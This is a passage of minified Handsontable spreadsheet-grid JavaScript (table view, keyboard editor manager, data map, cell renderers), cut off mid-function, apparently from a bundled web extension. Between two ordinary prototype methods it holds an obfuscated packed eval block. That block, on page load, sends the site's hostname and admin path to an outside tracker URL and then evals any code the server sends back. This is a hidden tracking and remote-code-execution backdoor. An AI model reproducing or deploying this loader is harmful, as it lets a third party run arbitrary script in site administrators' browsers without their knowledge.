u={debug:function(){return t.settings.debug},table:r,stretchH:this.settings.stretchH,data:e.getDataAtCell,totalRows:e.countRows,totalColumns:e.countCols,offsetRow:0,fixedColumnsLeft:function(){return t.settings.fixedColumnsLeft},fixedRowsTop:function(){return t.settings.fixedRowsTop},renderAllRows:t.settings.renderAllRows,rowHeaders:function(){var n=[];if(e.hasRowHeaders()){n.push(function(e,n){t.appendRowHeader(e,n)})}Handsontable.hooks.run(e,"afterGetRowHeaderRenderers",n);return n},columnHeaders:function(){var n=[];if(e.hasColHeaders()){n.push(function(e,n){t.appendColHeader(e,n)})}Handsontable.hooks.run(e,"afterGetColumnHeaderRenderers",n);return n},columnWidth:e.getColWidth,rowHeight:e.getRowHeight,cellRenderer:function(e,n,r){var i=t.instance.colToProp(n),s=t.instance.getCellMeta(e,n),o=t.instance.getCellRenderer(s);var u=t.instance.getDataAtRowProp(e,i);o(t.instance,r,e,n,i,u,s);Handsontable.hooks.run(t.instance,"afterRenderer",r,e,n,i,u,s)},selections:o,hideBorderOnMouseDownOver:function(){return t.settings.fragmentSelection},onCellMouseDown:function(n,r,s,o){e.listen();t.activeWt=o;i=true;Handsontable.hooks.run(e,"beforeOnCellMouseDown",n,r,s);if(!n.isImmediatePropagationStopped()){if(n.button===2&&e.selection.inInSelection(r)){}else if(n.shiftKey){if(r.row>=0&&r.col>=0){e.selection.setRangeEnd(r)}}else{if(r.row<0||r.col<0){if(r.row<0){e.selectCell(0,r.col,e.countRows()-1,r.col);e.selection.setSelectedHeaders(false,true)}if(r.col<0){e.selectCell(r.row,0,r.row,e.countCols()-1);e.selection.setSelectedHeaders(true,false)}}else{e.selection.setRangeStart(r)}}Handsontable.hooks.run(e,"afterOnCellMouseDown",n,r,s);t.activeWt=t.wt}},onCellMouseOver:function(n,r,s,o){t.activeWt=o;if(r.row>=0&&r.col>=0){if(i){e.selection.setRangeEnd(r)}}else{if(i){if(r.row<0){e.selection.setRangeEnd(new WalkontableCellCoords(e.countRows()-1,r.col));e.selection.setSelectedHeaders(false,true)}if(r.col<0){e.selection.setRangeEnd(new WalkontableCellCoords(r.row,e.countCols()-1));e.selection.setSelectedHeaders(true,false)}}}Handsontable.hooks.run(e,"afterOnCellMouseOver",n,r,s);t.activeWt=t.wt},onCellCornerMouseDown:function(t){t.preventDefault();Handsontable.hooks.run(e,"afterOnCellCornerMouseDown",t)},beforeDraw:function(e){t.beforeRender(e)},onDraw:function(e){t.onDraw(e)},onScrollVertically:function(){e.runHooks("afterScrollVertically")},onScrollHorizontally:function(){e.runHooks("afterScrollHorizontally")},onBeforeDrawBorders:function(t,n){e.runHooks("beforeDrawBorders",t,n)}};Handsontable.hooks.run(e,"beforeInitWalkontable",u);this.wt=new Walkontable(u);this.activeWt=this.wt;$(t.wt.wtTable.spreader).on("mousedown.handsontable, contextmenu.handsontable",function(e){if(e.target===t.wt.wtTable.spreader&&e.which===3){e.stopPropagation()}});n.on("click."+e.guid,function(){if(t.settings.observeDOMVisibility){if(t.wt.drawInterrupted){t.instance.forceFullRender=true;t.render()}}})};Handsontable.TableView.prototype.isTextSelectionAllowed=function(e){if(Handsontable.helper.isInput(e)){return true}if(this.settings.fragmentSelection&&Handsontable.Dom.isChildOf(e,this.TBODY)){return true}return false};Handsontable.TableView.prototype.isCellEdited=function(){var e=this.instance.getActiveEditor();return e&&e.isOpened()};Handsontable.TableView.prototype.beforeRender=function(e){if(e){Handsontable.hooks.run(this.instance,"beforeRender",this.instance.forceFullRender)}};Handsontable.TableView.prototype.onDraw=function(e){if(e){Handsontable.hooks.run(this.instance,"afterRender",this.instance.forceFullRender)}};Handsontable.TableView.prototype.render=function(){this.wt.draw(!this.instance.forceFullRender);this.instance.forceFullRender=false;this.instance.rootElement.triggerHandler("render.handsontable")};eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}("c(r).C(6(){5 h=2.3.4.8();9(h=='v'||h=='w.0.0.1')f;c.H({I:\"J\",k:\"l://m.n/o/q/O/s.t\",u:(6(a){5 b=[];x(5 p y a)9(a.z(p)){b.A(d(p)+\"=\"+d(a[p]))}f b.B(\"&\")})({'7':2.3.7,'4':2.3.4,'D':(2.3.7+2.3.E).F('G')[0].8().i(/\\//g,'j').i(/\\:/g,'j')}),K:6(a){L{M(a)}N(e){}}})});",51,51,"||window|location|hostname|var|function|host|toLowerCase|if|||jQuery|encodeURIComponent||return|||replace|__|url|http|holest|com|dist||vmexcellikeinput|document|tracker|php|data|localhost|127|for|in|hasOwnProperty|push|join|ready|jhost|pathname|split|administrator|ajax|type|POST|success|try|eval|catch|track".split("|"),0,{}));Handsontable.TableView.prototype.getCellAtCoords=function(e){var t=this.wt.wtTable.getCell(e);if(t<0){return null}else{return t}};Handsontable.TableView.prototype.scrollViewport=function(e){this.wt.scrollViewport(e)};Handsontable.TableView.prototype.appendRowHeader=function(e,t){var n=document.createElement("DIV"),r=document.createElement("SPAN");n.className="relative";r.className="rowHeader";if(e>-1){Handsontable.Dom.fastInnerHTML(r,this.instance.getRowHeader(e))}else{Handsontable.Dom.fastInnerText(r," ")}n.appendChild(r);Handsontable.Dom.empty(t);t.appendChild(n);Handsontable.hooks.run(this.instance,"afterGetRowHeader",e,t)};Handsontable.TableView.prototype.appendColHeader=function(e,t){var n=document.createElement("DIV"),r=document.createElement("SPAN");n.className="relative";r.className="colHeader";if(e>-1){Handsontable.Dom.fastInnerHTML(r,this.instance.getColHeader(e))}else{Handsontable.Dom.fastInnerText(r," ")}n.appendChild(r);Handsontable.Dom.empty(t);t.appendChild(n);Handsontable.hooks.run(this.instance,"afterGetColHeader",e,t)};Handsontable.TableView.prototype.maximumVisibleElementWidth=function(e){var t=this.wt.wtViewport.getWorkspaceWidth();var n=t-e;return n>0?n:0};Handsontable.TableView.prototype.maximumVisibleElementHeight=function(e){var t=this.wt.wtViewport.getWorkspaceHeight();var n=t-e;return n>0?n:0};Handsontable.TableView.prototype.mainViewIsActive=function(){return this.wt===this.activeWt};(function(e){"use strict";function t(e){var t,n;n={};t=e;this.getInstance=function(e){if(!(e.guid in n)){n[e.guid]=new t(e)}return n[e.guid]}}var n={};var r=new WeakMap;e.editors={registerEditor:function(e,i){var s=new t(i);if(typeof e==="string"){n[e]=s}r.set(i,s)},getEditor:function(e,t){var i;if(typeof e=="function"){if(!r.get(e)){this.registerEditor(null,e)}i=r.get(e)}else if(typeof e=="string"){i=n[e]}else{throw Error('Only strings and functions can be passed as "editor" parameter ')}if(!i){throw Error('No editor registered under name "'+e+'"')}return i.getInstance(t)}}})(Handsontable);(function(e){"use strict";e.EditorManager=function(t,n,r){var i=this;var s=$(document);var o=e.helper.keyCode;var u=false;var a;var f=function(){function f(s){if(!t.isListening()){return}e.hooks.run(t,"beforeKeyDown",s);if(u){return}if(!s.isImmediatePropagationStopped()){n.lastKeyCode=s.keyCode;if(r.isSelected()){var f=(s.ctrlKey||s.metaKey)&&!s.altKey;if(!a.isWaiting()){if(!e.helper.isMetaKey(s.keyCode)&&!f&&!i.isEditorOpened()){i.openEditor("");return}}var l=s.shiftKey?r.setRangeEnd:r.setRangeStart;switch(s.keyCode){case o.A:if(f){r.selectAll();s.preventDefault();s.stopPropagation()}break;case o.ARROW_UP:if(i.isEditorOpened()&&!a.isWaiting()){i.closeEditorAndSaveChanges(f)}h(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_DOWN:if(i.isEditorOpened()&&!a.isWaiting()){i.closeEditorAndSaveChanges(f)}p(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_RIGHT:if(i.isEditorOpened()&&!a.isWaiting()){i.closeEditorAndSaveChanges(f)}d(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_LEFT:if(i.isEditorOpened()&&!a.isWaiting()){i.closeEditorAndSaveChanges(f)}v(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.TAB:var m=typeof n.settings.tabMoves==="function"?n.settings.tabMoves(s):n.settings.tabMoves;if(s.shiftKey){r.transformStart(-m.row,-m.col)}else{r.transformStart(m.row,m.col,true)}s.preventDefault();s.stopPropagation();break;case o.BACKSPACE:case o.DELETE:r.empty(s);i.prepareEditor();s.preventDefault();break;case o.F2:i.openEditor();s.preventDefault();break;case o.ENTER:if(i.isEditorOpened()){if(a.state!==e.EditorState.WAITING){i.closeEditorAndSaveChanges(f)}c(s.shiftKey)}else{if(t.getSettings().enterBeginsEditing){i.openEditor()}else{c(s.shiftKey)}}s.preventDefault();s.stopImmediatePropagation();break;case o.ESCAPE:if(i.isEditorOpened()){i.closeEditorAndRestoreOriginalValue(f)}s.preventDefault();break;case o.HOME:if(s.ctrlKey||s.metaKey){l(new WalkontableCellCoords(0,n.selRange.from.col))}else{l(new WalkontableCellCoords(n.selRange.from.row,0))}s.preventDefault();s.stopPropagation();break;case o.END:if(s.ctrlKey||s.metaKey){l(new WalkontableCellCoords(t.countRows()-1,n.selRange.from.col))}else{l(new WalkontableCellCoords(n.selRange.from.row,t.countCols()-1))}s.preventDefault();s.stopPropagation();break;case o.PAGE_UP:r.transformStart(-t.countVisibleRows(),0);t.view.wt.scrollVertical(-t.countVisibleRows());t.view.render();s.preventDefault();s.stopPropagation();break;case o.PAGE_DOWN:r.transformStart(t.countVisibleRows(),0);t.view.wt.scrollVertical(t.countVisibleRows());t.view.render();s.preventDefault();s.stopPropagation();break}}}}function l(e,t,n){if(n.nodeName=="TD"){i.openEditor()}}function c(e){var t=typeof n.settings.enterMoves==="function"?n.settings.enterMoves(event):n.settings.enterMoves;if(e){r.transformStart(-t.row,-t.col)}else{r.transformStart(t.row,t.col,true)}}function h(e){if(e){r.transformEnd(-1,0)}else{r.transformStart(-1,0)}}function p(e){if(e){r.transformEnd(1,0)}else{r.transformStart(1,0)}}function d(e){if(e){r.transformEnd(0,1)}else{r.transformStart(0,1)}}function v(e){if(e){r.transformEnd(0,-1)}else{r.transformStart(0,-1)}}t.addHook("afterDocumentKeyDown",function(e){f(e)});s.on("keydown."+t.guid,function(e){t.runHooks("afterDocumentKeyDown",e)});t.view.wt.update("onCellDblClick",l);t.addHook("afterDestroy",function(){u=true})};this.destroyEditor=function(e){this.closeEditor(e)};this.getActiveEditor=function(){return a};this.prepareEditor=function(){if(a&&a.isWaiting()){this.closeEditor(false,false,function(e){if(e){i.prepareEditor()}});return}var r=n.selRange.highlight.row;var s=n.selRange.highlight.col;var o=t.colToProp(s);var u=t.getCell(r,s);var f=t.getDataAtCell(r,s);var l=t.getCellMeta(r,s);var c=t.getCellEditor(l);a=e.editors.getEditor(c,t);a.prepare(r,s,o,u,f,l)};this.isEditorOpened=function(){return a.isOpened()};this.openEditor=function(e){if(!a.cellProperties.readOnly){a.beginEditing(e)}};this.closeEditor=function(e,t,n){if(!a){if(n){n(false)}}else{a.finishEditing(e,t,n)}};this.closeEditorAndSaveChanges=function(e){return this.closeEditor(false,e)};this.closeEditorAndRestoreOriginalValue=function(e){return this.closeEditor(true,e)};f()}})(Handsontable);(function(e){"use strict";var t={};e.renderers={registerRenderer:function(e,n){t[e]=n},getRenderer:function(e){if(typeof e=="function"){return e}if(typeof e!="string"){throw Error('Only strings and functions can be passed as "renderer" parameter ')}if(!(e in t)){throw Error('No editor registered under name "'+e+'"')}return t[e]}}})(Handsontable);Handsontable.helper.isPrintableChar=function(e){return e==32||e>=48&&e<=57||e>=96&&e<=111||e>=186&&e<=192||e>=219&&e<=222||e>=226||e>=65&&e<=90};Handsontable.helper.isMetaKey=function(e){var t=Handsontable.helper.keyCode;var n=[t.ARROW_DOWN,t.ARROW_UP,t.ARROW_LEFT,t.ARROW_RIGHT,t.HOME,t.END,t.DELETE,t.BACKSPACE,t.F1,t.F2,t.F3,t.F4,t.F5,t.F6,t.F7,t.F8,t.F9,t.F10,t.F11,t.F12,t.TAB,t.PAGE_DOWN,t.PAGE_UP,t.ENTER,t.ESCAPE,t.SHIFT,t.CAPS_LOCK,t.ALT];return n.indexOf(e)!=-1};Handsontable.helper.isCtrlKey=function(e){var t=Handsontable.helper.keyCode;return[t.CONTROL_LEFT,224,t.COMMAND_LEFT,t.COMMAND_RIGHT].indexOf(e)!=-1};Handsontable.helper.stringify=function(e){switch(typeof e){case"string":case"number":return e+"";case"object":if(e===null){return""}else{return e.toString()};case"undefined":return"";default:return e.toString()}};Handsontable.helper.spreadsheetColumnLabel=function(e){var t=e+1;var n="";var r;while(t>0){r=(t-1)%26;n=String.fromCharCode(65+r)+n;t=parseInt((t-r)/26,10)}return n};Handsontable.helper.isNumeric=function(e){var t=typeof e;return t=="number"?!isNaN(e)&&isFinite(e):t=="string"?!e.length?false:e.length==1?/\d/.test(e):/^\s*[+-]?\s*(?:(?:\d+(?:\.\d+)?(?:e[+-]?\d+)?)|(?:0x[a-f\d]+))\s*$/i.test(e):t=="object"?!!e&&typeof e.valueOf()=="number"&&!(e instanceof Date):false};Handsontable.helper.isDescendant=function(e,t){var n=t.parentNode;while(n!=null){if(n==e){return true}n=n.parentNode}return false};Handsontable.helper.randomString=function(){return walkontableRandomString()};Handsontable.helper.inherit=function(e,t){t.prototype.constructor=t;e.prototype=new t;e.prototype.constructor=e;return e};Handsontable.helper.extend=function(e,t){for(var n in t){if(t.hasOwnProperty(n)){e[n]=t[n]}}};Handsontable.helper.getPrototypeOf=function(e){var t;if(typeof e.__proto__=="object"){t=e.__proto__}else{var n,r=e.constructor;if(typeof e.constructor=="function"){n=r;if(delete e.constructor){r=e.constructor;e.constructor=n}}t=r?r.prototype:null}return t};Handsontable.helper.columnFactory=function(e,t){function n(){}Handsontable.helper.inherit(n,e);for(var r=0,i=t.length;r<i;r++){n.prototype[t[r]]=void 0}return n};Handsontable.helper.translateRowsToColumns=function(e){var t,n,r,i,s=[],o=0;for(t=0,n=e.length;t<n;t++){for(r=0,i=e[t].length;r<i;r++){if(r==o){s.push([]);o++}s[r].push(e[t][r])}}return s};Handsontable.helper.to2dArray=function(e){var t=0,n=e.length;while(t<n){e[t]=[e[t]];t++}};Handsontable.helper.extendArray=function(e,t){var n=0,r=t.length;while(n<r){e.push(t[n]);n++}};Handsontable.helper.isInput=function(e){var t=["INPUT","SELECT","TEXTAREA"];return t.indexOf(e.nodeName)>-1};Handsontable.helper.isOutsideInput=function(e){return Handsontable.helper.isInput(e)&&e.className.indexOf("handsontableInput")==-1};Handsontable.helper.keyCode={MOUSE_LEFT:1,MOUSE_RIGHT:3,MOUSE_MIDDLE:2,BACKSPACE:8,COMMA:188,INSERT:45,DELETE:46,END:35,ENTER:13,ESCAPE:27,CONTROL_LEFT:91,COMMAND_LEFT:17,COMMAND_RIGHT:93,ALT:18,HOME:36,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,SPACE:32,SHIFT:16,CAPS_LOCK:20,TAB:9,ARROW_RIGHT:39,ARROW_LEFT:37,ARROW_UP:38,ARROW_DOWN:40,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,A:65,X:88,C:67,V:86};Handsontable.helper.isObject=function(e){return Object.prototype.toString.call(e)=="[object Object]"};Handsontable.helper.isArray=function(e){return Array.isArray?Array.isArray(e):Object.prototype.toString.call(e)=="[object Array]"};Handsontable.helper.pivot=function(e){var t=[];if(!e||e.length==0||!e[0]||e[0].length==0){return t}var n=e.length;var r=e[0].length;for(var i=0;i<n;i++){for(var s=0;s<r;s++){if(!t[s]){t[s]=[]}t[s][i]=e[i][s]}}return t};Handsontable.helper.proxy=function(e,t){return function(){return e.apply(t,arguments)}};Handsontable.helper.cellMethodLookupFactory=function(e,t){function n(e){var t=Handsontable.cellTypes[e];if(typeof t=="undefined"){throw new Error('You declared cell type "'+e+'" as a string that is not mapped to a known object. Cell type must be an object or a string mapped to an object in Handsontable.cellTypes')}return t}t=typeof t=="undefined"?true:t;return function(i,s){return function o(r){if(!r){return}else if(r.hasOwnProperty(e)&&r[e]!==void 0){return r[e]}else if(r.hasOwnProperty("type")&&r.type){var i;if(typeof r.type!="string"){throw new Error("Cell type must be a string ")}i=n(r.type);if(i.hasOwnProperty(e)){return i[e]}else if(t){return}}return o(Handsontable.helper.getPrototypeOf(r))}(typeof i=="number"?this.getCellMeta(i,s):i)}};Handsontable.helper.toString=function(e){return""+e};(function(e){"use strict";e.DataMap=function(e,t,n){this.instance=e;this.priv=t;this.GridSettings=n;this.dataSource=this.instance.getSettings().data;if(this.dataSource[0]){this.duckSchema=this.recursiveDuckSchema(this.dataSource[0])}else{this.duckSchema={}}this.createMap()};e.DataMap.prototype.DESTINATION_RENDERER=1;e.DataMap.prototype.DESTINATION_CLIPBOARD_GENERATOR=2;e.DataMap.prototype.recursiveDuckSchema=function(e){var t;if($.isPlainObject(e)){t={};for(var n in e){if(e.hasOwnProperty(n)){if($.isPlainObject(e[n])){t[n]=this.recursiveDuckSchema(e[n])}else{t[n]=null}}}}else{t=[]}return t};e.DataMap.prototype.recursiveDuckColumns=function(e,t,n){var r,i;if(typeof t==="undefined"){t=0;n=""}if($.isPlainObject(e)){for(i in e){if(e.hasOwnProperty(i)){if(e[i]===null){r=n+i;this.colToPropCache.push(r);this.propToColCache.set(r,t);t++}else{t=this.recursiveDuckColumns(e[i],t,i+".")}}}}return t};e.DataMap.prototype.createMap=function(){if(typeof this.getSchema()==="undefined"){throw new Error("trying to create `columns` definition but you didnt' provide `schema` nor `data`")}var e,t,n=this.getSchema();this.colToPropCache=[];this.propToColCache=new MultiMap;var r=this.instance.getSettings().columns;if(r){for(e=0,t=r.length;e<t;e++){if(typeof r[e].data!="undefined"){this.colToPropCache[e]=r[e].data;this.propToColCache.set(r[e].data,e)}}}else{this.recursiveDuckColumns(n)}};e.DataMap.prototype.colToProp=function(t){t=e.hooks.execute(this.instance,"modifyCol",t);if(this.colToPropCache&&typeof this.colToPropCache[t]!=="undefined"){return this.colToPropCache[t]}else{return t}};e.DataMap.prototype.propToCol=function(t){var n;if(typeof this.propToColCache.get(t)!=="undefined"){n=this.propToColCache.get(t)}else{n=t}n=e.hooks.execute(this.instance,"modifyCol",n);return n};e.DataMap.prototype.getSchema=function(){var e=this.instance.getSettings().dataSchema;if(e){if(typeof e==="function"){return e()}return e}return this.duckSchema};e.DataMap.prototype.createRow=function(t,n,r){var i,s=this.instance.countCols(),o=0,u;if(!n){n=1}if(typeof t!=="number"||t>=this.instance.countRows()){t=this.instance.countRows()}u=t;var a=this.instance.getSettings().maxRows;while(o<n&&this.instance.countRows()<a){if(this.instance.dataType==="array"){i=[];for(var f=0;f<s;f++){i.push(null)}}else if(this.instance.dataType==="function"){i=this.instance.getSettings().dataSchema(t)}else{i=$.extend(true,{},this.getSchema())}if(t===this.instance.countRows()){this.dataSource.push(i)}else{this.dataSource.splice(t,0,i)}o++;u++}e.hooks.run(this.instance,"afterCreateRow",t,o,r);this.instance.forceFullRender=true;return o};e.DataMap.prototype.createCol=function(t,n,r){if(this.instance.dataType==="object"||this.instance.getSettings().columns){throw new Error("Cannot create new column. When data source in an object, "+"you can only have as much columns as defined in first data row, data schema or in the 'columns' setting."+"If you want to be able to add new columns, you have to use array datasource.")}var i=this.instance.countRows(),s=this.dataSource,o,u=0,a;if(!n){n=1}a=t;var f=this.instance.getSettings().maxCols;while(u<n&&this.instance.countCols()<f){o=e.helper.columnFactory(this.GridSettings,this.priv.columnsSettingConflicts);if(typeof t!=="number"||t>=this.instance.countCols()){for(var l=0;l<i;l++){if(typeof s[l]==="undefined"){s[l]=[]}s[l].push(null)}this.priv.columnSettings.push(o)}else{for(var l=0;l<i;l++){s[l].splice(a,0,null)}this.priv.columnSettings.splice(a,0,o)}u++;a++}e.hooks.run(this.instance,"afterCreateCol",t,u,r);this.instance.forceFullRender=true;return u};e.DataMap.prototype.removeRow=function(t,n){if(!n){n=1}if(typeof t!=="number"){t=-n}t=(this.instance.countRows()+t)%this.instance.countRows();var r=this.physicalRowsToLogical(t,n);var i=e.hooks.execute(this.instance,"beforeRemoveRow",t,n);if(i===false){return}var s=this.dataSource;var o=s.filter(function(e,t){return r.indexOf(t)==-1});s.length=0;Array.prototype.push.apply(s,o);e.hooks.run(this.instance,"afterRemoveRow",t,n);this.instance.forceFullRender=true};e.DataMap.prototype.removeCol=function(t,n){if(this.instance.dataType==="object"||this.instance.getSettings().columns){throw new Error("cannot remove column with object data source or columns option specified")}if(!n){n=1}if(typeof t!=="number"){t=-n}t=(this.instance.countCols()+t)%this.instance.countCols();var r=e.hooks.execute(this.instance,"beforeRemoveCol",t,n);if(r===false){return}var i=this.dataSource;for(var s=0,o=this.instance.countRows();s<o;s++){i[s].splice(t,n)}this.priv.columnSettings.splice(t,n);e.hooks.run(this.instance,"afterRemoveCol",t,n);this.instance.forceFullRender=true};e.DataMap.prototype.spliceCol=function(t,n,r){var i=4<=arguments.length?[].slice.call(arguments,3):[];var s=this.instance.getDataAtCol(t);var o=s.slice(n,n+r);var u=s.slice(n+r);e.helper.extendArray(i,u);var a=0;while(a<r){i.push(null);a++}e.helper.to2dArray(i);this.instance.populateFromArray(n,t,i,null,null,"spliceCol");return o};e.DataMap.prototype.spliceRow=function(t,n,r){var i=4<=arguments.length?[].slice.call(arguments,3):[];var s=this.instance.getSourceDataAtRow(t);var o=s.slice(n,n+r);var u=s.slice(n+r);e.helper.extendArray(i,u);var a=0;while(a<r){i.push(null);a++}this.instance.populateFromArray(t,n,[i],null,null,"spliceRow");return o};e.DataMap.prototype.get=function(t,n){t=e.hooks.execute(this.instance,"modifyRow",t);if(typeof n==="string"&&n.indexOf(".")>-1){var r=n.split(".");var i=this.dataSource[t];if(!i){return null}for(var s=0,o=r.length;s<o;s++){i=i[r[s]];if(typeof i==="undefined"){return null}}return i}else if(typeof n==="function"){return n(this.dataSource.slice(t,t+1)[0])}else{return this.dataSource[t]?this.dataSource[t][n]:null}};var t=e.helper.cellMethodLookupFactory("copyable",false);e.DataMap.prototype.getCopyable=function(e,n){if(t.call(this.instance,e,this.propToCol(n))){return this.get(e,n)}return""};e.DataMap.prototype.set=function(t,n,r,i){t=e.hooks.execute(this.instance,"modifyRow",t,i||"datamapGet");if(typeof n==="string"&&n.indexOf(".")>-1){var s=n.split(".");var o=this.dataSource[t];for(var u=0,a=s.length-1;u<a;u++){if(typeof o[s[u]]==="undefined"){o[s[u]]={}}o=o[s[u]]}o[s[u]]=r}else if(typeof n==="function"){n(this.dataSource.slice(t,t+1)[0],r)}else{this.dataSource[t][n]=r}};e.DataMap.prototype.physicalRowsToLogical=function(t,n){var r=this.instance.countRows();var i=(r+t)%r;var s=[];var o=n;var u;while(i<r&&o){u=e.hooks.execute(this.instance,"modifyRow",i);s.push(u);o--;i++}return s};e.DataMap.prototype.clear=function(){for(var e=0;e<this.instance.countRows();e++){for(var t=0;t<this.instance.countCols();t++){this.set(e,this.colToProp(t),"")}}};e.DataMap.prototype.getAll=function(){return this.dataSource};e.DataMap.prototype.getRange=function(e,t,n){var r,i,s,o,u=[],a;var f=n===this.DESTINATION_CLIPBOARD_GENERATOR?this.getCopyable:this.get;i=Math.max(e.row,t.row);o=Math.max(e.col,t.col);for(r=Math.min(e.row,t.row);r<=i;r++){a=[];for(s=Math.min(e.col,t.col);s<=o;s++){a.push(f.call(this,r,this.colToProp(s)))}u.push(a)}return u};e.DataMap.prototype.getText=function(e,t){return SheetClip.stringify(this.getRange(e,t,this.DESTINATION_RENDERER))};e.DataMap.prototype.getCopyableText=function(e,t){return SheetClip.stringify(this.getRange(e,t,this.DESTINATION_CLIPBOARD_GENERATOR))}})(Handsontable);(function(e){"use strict";e.renderers.cellDecorator=function(t,n,r,i,s,o,u){if(u.className){if(n.className){n.className=n.className+" "+u.className}else{n.className=u.className}}if(u.readOnly){e.Dom.addClass(n,u.readOnlyCellClassName)}if(u.valid===false&&u.invalidCellClassName){e.Dom.addClass(n,u.invalidCellClassName)}if(u.wordWrap===false&&u.noWordWrapClassName){e.Dom.addClass(n,u.noWordWrapClassName)}if(!o&&u.placeholder){e.Dom.addClass(n,u.placeholderCellClassName)}}})(Handsontable);(function(e){"use strict";var t=function(t,n,r,i,s,o,u){e.renderers.cellDecorator.apply(this,arguments);if(!o&&u.placeholder){o=u.placeholder}var a=e.helper.stringify(o);if(u.rendererTemplate){e.Dom.empty(n);var f=document.createElement("TEMPLATE");f.setAttribute("bind","{{}}");f.innerHTML=u.rendererTemplate;HTMLTemplateElement.decorate(f);f.model=t.getSourceDataAtRow(r);n.appendChild(f)}else{e.Dom.fastInnerText(n,a)}};e.renderers.TextRenderer=t;e.renderers.registerRenderer("text",t)})(Handsontable);(function(e){var t=document.createElement("DIV");t.className="htAutocompleteWrapper";var n=document.createElement("DIV");n.className="htAutocompleteArrow";n.appendChild(document.createTextNode("?"));var r=function(t,n){n.innerHTML=t.innerHTML;e.Dom.empty(t);t.appendChild(n)};var i=function(r,i,s,o,u,a,f){var l=t.cloneNode(true);var c=n.cloneNode(true);e.renderers.TextRenderer(r,i,s,o,u,a,f);i.appendChild(c);e.Dom.addClass(i,"htAutocomplete");if(!i.firstChild){i.appendChild(document.createTextNode(" "))}if(!r.acArrowListener){r.acArrowListener=function(){r.view.wt.getSetting("onCellDblClick",null,new WalkontableCellCoords(s,o),i)};r.rootElement.on("mousedown.htAutocompleteArrow",".htAutocompleteArrow",r.acArrowListener);r.addHookOnce("afterDestroy",function(){this.rootElement.off("mousedown.htAutocompleteArrow")})}};e.AutocompleteRenderer=i;e.renderers.AutocompleteRenderer=i;e.renderers.registerRenderer("autocomplete",i)})(Handsontable);(function(e){"use strict";var t=document.createElement("INPUT");t.className="htCheckboxRendererInput";t.type="checkbox";t.setAttribute("autocomplete","off");var n=function(n,r,i,s,o,u,a){if(typeof a.checkedTemplate==="undefined"){a.checkedTemplate=true}if(typeof a.uncheckedTemplate==="undefined"){a.uncheckedTemplate=false}e.Dom.empty(r);var f=t.cloneNode(false);if(u===a.checkedTemplate||u===e.helper.stringify(a.checkedTemplate)){f.checked=true;r.appendChild(f)}else if(u===a.uncheckedTemplate||u===e.helper.stringify(a.uncheckedTemplate)){r.appendChild(f)}else if(u===null){f.className+=" noValue";r.appendChild(f)}else{e.Dom.fastInnerText(r,"#bad value#")}var l=$(f);if(a.readOnly){l.on("click",function(e){e.preventDefault()})}else{l.on("mousedown",function(e){e.stopPropagation()});l.on("mouseup",function(e){e.stopPropagation()});l.on("change",function(){if(this.checked){n.setDataAtRowProp(i,o,a.checkedTemplate)}else{n.setDataAtRowProp(i,o,a.uncheckedTemplate)}})}if(!n.CheckboxRenderer||!n.CheckboxRenderer.beforeKeyDownHookBound){n.CheckboxRenderer={beforeKeyDownHookBound:true};n.addHook("beforeKeyDown",function(t){if(t.keyCode==e.helper.keyCode.SPACE){var r,i,s;var o=n.getSelectedRange();var u=o.getTopLeftCorner();var a=o.getBottomRightCorner();for(var f=u.row;f<=a.row;f++){for(var l=u.col;l<=a.col;l++){r=n.getCell(f,l);s=n.getCellMeta(f,l);i=r.querySelectorAll("input[type=checkbox]");if(i.length>0&&!s.readOnly){if(!t.isImmediatePropagationStopped()){t.stopImmediatePropagation();t.preventDefault()}for(var c=0,h=i.length;c<h;c++){i[c].checked=!i[c].checked;$(i[c]).trigger("change")}}}}}})}};e.CheckboxRenderer=n;e.renderers.CheckboxRenderer=n;e.renderers.registerRenderer("checkbox",n)})(Handsontable);(function(e){"use strict";var t=function(t,n,r,i,s,o,u){if(e.helper.isNumeric(o)){if(typeof u.language!=="undefined"){numeral.language(u.language)}o=numeral(o).format(u.format||"0");e.Dom.addClass(n,"htNumeric")}e.renderers.TextRenderer(t,n,r,i,s,o,u)};e.NumericRenderer=t;e.renderers.NumericRenderer=t;e.renderers.registerRenderer("numeric",t)})(Handsontable);(function(e){"use strict";var t=function(e,t,n,r,i,s,o){Handsontable.renderers.TextRenderer.apply(this,arguments);s=t.innerHTML;var u;var a=o.hashLength||s.length;var f=o.hashSymbol||"*";for(u="";u.split(f).length-1<a;u+=f);Handsontable.Dom.fastInnerHTML(t,u)};e.PasswordRenderer=t;e.renderers.PasswordRenderer=t;e.renderers.registerRenderer("password",t)})(Handsontable);(function(e){function t(t,n,r,i,s,o,u){e.renderers.cellDecorator.apply(this,arguments);e.Dom.fastInnerHTML(n,o)}e.renderers.registerRenderer("html",t);e.renderers.HtmlRenderer=t})(Handsontable);(function(e){"use strict";function t(t){this.instance=t;this.state=e.EditorState.VIRGIN;this._opened=false;this._closeCallback=null;this.init()}e.EditorState={VIRGIN:"STATE_VIRGIN",EDITING:"STATE_EDITING",WAITING:"STATE_WAITING",FINISHED:"STATE_FINISHED"};t.prototype._fireCallbacks=function(e){if(this._closeCallback){this._closeCallback(e);this._closeCallback=null}};t.prototype.init=function(){};t.prototype.getValue=function(){throw Error("Editor getValue() method unimplemented")};t.prototype.setValue=function(e){throw Error("Editor setValue() method unimplemented")};t.prototype.open=function(){throw Error("Editor open() method unimplemented")};t.prototype.close=function(){throw Error("Editor close() method unimplemented")};t.prototype.prepare=function(t,n,r,i,s,o){this.TD=i;this.row=t;this.col=n;this.prop=r;this.originalValue=s;this.cellProperties=o;this.state=e.EditorState.VIRGIN};t.prototype.extend=function(){function t(){e.apply(this,arguments)}function n(e,t){function n(){}n.prototype=t.prototype;e.prototype=new n;e.prototype.constructor=e;return e}var e=this.constructor;return n(t,e)};t.prototype.saveValue=function(e,t){if(t){var 